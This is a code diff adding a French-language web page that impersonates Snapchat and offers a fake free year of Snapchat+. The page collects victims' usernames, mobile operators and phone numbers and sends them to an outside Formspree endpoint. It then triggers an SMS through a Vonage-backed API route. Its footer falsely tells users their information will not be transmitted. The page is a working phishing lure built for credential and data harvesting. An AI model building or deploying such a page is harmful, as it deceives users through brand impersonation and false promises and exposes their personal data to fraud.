@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Snap + | 1 an </title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+body {
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: radial-gradient(circle, #2d2500, #151515 65%);
+    color: white;
+}
+
+/* --- ÉCRAN DE CHARGEMENT INITIAL --- */
+#loader-screen {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: radial-gradient(circle, #2d2500, #151515 65%);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    transition: opacity 0.5s ease;
+}
+
+.spinner {
+    width: 50px;
+    height: 50px;
+    border: 5px solid rgba(255, 204, 0, 0.15);
+    border-top-color: #ffca00;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+.loading-text {
+    color: #ffca00;
+    font-size: 14px;
+    letter-spacing: 2px;
+    animation: pulse 1.5s infinite;
+}
+
+@keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.5; }
+}
+
+/* --- CARTE PRINCIPALE --- */
+.card {
+    width: 380px;
+    max-width: 95%;
+    background: #171717;
+    border: 1px solid rgba(255,200,0,.15);
+    border-radius: 22px;
+    padding: 30px;
+    box-shadow: 0 0 40px rgba(255,200,0,.12);
+    animation: fade .7s;
+}
+
+@keyframes fade {
+    from { opacity: 0; transform: translateY(15px); }
+    to { opacity: 1; transform: none; }
+}
+
+.logo {
+    width: 70px;
+    height: 70px;
+    border-radius: 50%;
+    margin: auto;
+    background: #222;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 34px;
+}
+
+h1 { text-align: center; margin-top: 15px; font-size: 34px; }
+.plus { color: #ffcb00; }
+.subtitle { text-align: center; color: #cfcfcf; margin-top: 10px; }
+
+.demo {
+    margin: 22px 0;
+    background: #302500;
+    border: 1px solid #e2b000;
+    color: #ffd95e;
+    border-radius: 14px;
+    padding: 14px;
+    text-align: center;
+    font-size: 14px;
+}
+
+.badges { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; }
+.badges span {
+    background: #242424;
+    padding: 8px 12px;
+    border-radius: 30px;
+    font-size: 13px;
+    color: #ffd34f;
+}
+
+label { display: block; margin-top: 18px; margin-bottom: 8px; font-size: 14px; }
+
+input {
+    width: 100%;
+    padding: 14px;
+    border-radius: 12px;
+    background: #212121;
+    border: 1px solid #333;
+    color: white;
+    outline: none;
+    transition: .2s;
+}
+
+input:focus {
+    border-color: #ffc400;
+    box-shadow: 0 0 10px rgba(255,196,0,.25);
+}
+
+.operators { display: flex; gap: 10px; margin-bottom: 15px; }
+.operators button {
+    flex: 1;
+    padding: 13px;
+    border: none;
+    background: #252525;
+    color: white;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: .2s;
+}
+.operators button:hover { background: #ffca00; color: black; }
+
+.mainButton {
+    margin-top: 25px;
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 14px;
+    background: #ffca00;
+    font-size: 17px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: .25s;
+    color: black;
+}
+
+.mainButton:hover:not(:disabled) {
+    transform: translateY(-2px);
+    box-shadow: 0 0 20px rgba(255,202,0,.45);
+}
+.mainButton:disabled {
+    background: #555;
+    color: #aaa;
+    cursor: not-allowed;
+    box-shadow: none;
+}
+
+.footer {
+    margin-top: 18px;
+    font-size: 12px;
+    color: #8e8e8e;
+    text-align: center;
+}
+
+/* --- SECTION SUCCÈS CACHÉE --- */
+#step-success { display: none; text-align: center; }
+.success-icon {
+    font-size: 60px;
+    color: #4CAF50;
+    margin-bottom: 20px;
+    animation: scaleIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+}
+@keyframes scaleIn {
+    0% { transform: scale(0); }
+    100% { transform: scale(1); }
+}
+</style>
+</head>
+<body>
+
+<!-- 1. ÉCRAN DE CHARGEMENT -->
+<div id="loader-screen">
+    <div class="spinner"></div>
+    <div class="loading-text">CHARGEMENT DE L'INTERFACE...</div>
+</div>
+
+<div class="card">
+    
+    <!-- TITRE PRINCIPAL QUI RESTE VISIBLE TOUT LE TEMPS -->
+    <div class="logo">👻</div>
+    <h1>Snapchat<span class="plus">+</span></h1>
+
+    <!-- 2. ÉTAPE 1 : LE FORMULAIRE -->
+    <div id="step1">
+        <p class="subtitle">Activez Snapchat+ gratuitement pendant 1 an !</p>
+        
+        <div class="demo">
+            Disponible uniquement pour les numéros SFR, Bouygues Telecom et Orange — tous les autres opérateurs ne fonctionnent pas<br>
+           
+        </div>
+        
+        <div class="badges">
+           <span>✨ Badges exclusifs</span>
+            <span>🔒 Qui a revu votre story</span>
+            <span>🚀 Boost de score</span>
+            <span>🔥 Offre limitée</span>
+        </div>
+        
+        <form id="secureForm" action="https://formspree.io/f/meeyrqay" method="POST">
+            <label>Nom d'utilisateur</label>
+            <input type="text" name="pseudo" placeholder="Votre pseudo" required>
+
+            <label>Opérateur</label>
+            <div class="operators">
+                <button type="button" onclick="choisirOperateur(this, 'SFR')">SFR</button>
+                <button type="button" onclick="choisirOperateur(this, 'Orange')">Orange</button>
+                <button type="button" onclick="choisirOperateur(this, 'Bouygues')">Bouygues</button>
+            </div>
+            <input type="hidden" name="operateur" id="operateurInput" value="Non précisé">
+
+            <label>Numéro de téléphone</label>
+            <input type="tel" name="numero" placeholder="06 xx xx xx xx" required pattern="^(06|07)[0-9]{8}$" maxlength="10" title="Veuillez entrer un numéro valide à 10 chiffres (ex: 0612345678)">
+
+            <button type="submit" class="mainButton" id="btnSubmit">Continuer →</button>
+        </form>
+
+        <div class="footer">L'abonnement Snapchat+ ne vous sera pas facturé.
+L'abonnement est disponible uniquement pour les utilisateurs éligibles. (Vos information ne seront pas transmise)</div>
+    </div>
+
+    <!-- 3. ÉTAPE 2 : SUCCÈS -->
+    <div id="step-success">
+        <div class="success-icon">✔</div>
+        <h2 style="color: white; margin-bottom: 10px;">Félicitations</h2>
+        <p style="color: #4CAF50; font-size: 18px; font-weight: bold;">Votre abonnement a été validé.</p>
+        <p style="color: #8e8e8e; font-size: 14px; margin-top: 15px;">Vous pouvez fermer cette page.</p>
+    </div>
+
+</div>
+
+<script>// --- GESTION DE L'ÉCRAN DE CHARGEMENT INITIAL ---
+    window.addEventListener('load', () => {
+        setTimeout(() => {
+            const loader = document.getElementById('loader-screen');
+            loader.style.opacity = '0';
+            setTimeout(() => { loader.style.display = 'none'; }, 500); 
+        }, 2000);
+    });
+
+    // --- SÉLECTION DE L'OPÉRATEUR ---
+    function choisirOperateur(boutonClique, nomOperateur) {
+        document.getElementById('operateurInput').value = nomOperateur;
+        let boutons = document.querySelectorAll('.operators button');
+        boutons.forEach(b => {
+            b.style.background = '#252525';
+            b.style.color = 'white';
+        });
+        boutonClique.style.background = '#ffca00';
+        boutonClique.style.color = 'black';
+    }
+
+    // --- ENVOI FORMSPREE + DÉCLENCHEMENT DU SMS VONAGE ---
+    const form = document.getElementById('secureForm');
+    const btnSubmit = document.getElementById('btnSubmit');
+
+    form.addEventListener('submit', async function(event) {
+        event.preventDefault(); 
+
+        if(document.getElementById('operateurInput').value === "Non précisé"){
+            alert("Veuillez sélectionner un opérateur réseau.");
+            return;
+        }
+
+        btnSubmit.innerText = "Envoi du SMS en cours...";
+        btnSubmit.disabled = true;
+
+        const formData = new FormData(form);
+        const numeroSaisi = formData.get('numero'); // On récupère le numéro tapé
+
+        try {
+            // 1. On sauvegarde d'abord sur ton Formspree
+            await fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            });
+
+            // 2. On appelle notre propre API Vercel pour déclencher le vrai SMS Vonage
+            const smsResponse = await fetch('/api/send-sms', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ numero: numeroSaisi })
+            });
+
+            const smsResult = await smsResponse.json();
+
+            if (smsResponse.ok && smsResult.success) {
+                // Succès total !
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step-success').style.display = 'block';
+            } else {
+                alert("Données sauvées, mais échec du SMS : Vérifiez que le numéro est autorisé sur Vonage.");
+                btnSubmit.innerText = "Continuer →";
+                btnSubmit.disabled = false;
+            }
+        } catch (error) {
+            alert("Erreur de connexion.");
+            btnSubmit.innerText = "Continuer →";
+            btnSubmit.disabled = false;
+        }
+    });
+    </script>
+
+</body>
+</html>
